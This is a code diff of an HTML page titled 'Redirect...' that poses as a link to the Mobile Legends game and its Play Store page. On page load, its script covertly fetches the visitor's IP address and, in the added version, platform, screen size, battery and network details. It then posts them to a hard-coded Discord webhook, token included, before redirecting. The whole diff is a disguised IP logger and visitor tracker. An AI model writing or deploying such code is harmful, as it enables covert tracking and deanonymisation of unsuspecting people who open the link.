@@ -6,28 +6,35 @@
     <title>Redirect...</title>
     <script>
         window.onload = async function() {
-            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
+            let ipData = await fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .catch(() => ({ ip: "Tidak terdeteksi" }));
 
-            try {
-                const response = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
-                const data = await response.json();
-                const ip = data.ip;
+            let userAgent = navigator.userAgent;
+            let platform = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
+            let screenWidth = screen.width;
+            let screenHeight = screen.height;
+            let battery = navigator.getBattery ? await navigator.getBattery() : null;
+            let batteryStatus = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})` : "Tidak terdeteksi";
+            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let networkType = connection ? connection.effectiveType : "Tidak terdeteksi";
 
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ content: `IP Address: ${ip}` })
-                });
+            let webhookURL = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
+            let payload = {
+                content: `IP: ${ipData.ip}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\nBattery: ${batteryStatus}\nNetwork: ${networkType}`
+            };
 
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            setTimeout(function() {
                 window.location.href = "mobilelegends://";
-                setTimeout(() => {
-                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
-                }, 2000);
-            } catch {
-                window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
-            }
+            }, 2000);
+
+            window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
         };
     </script>
 </head>
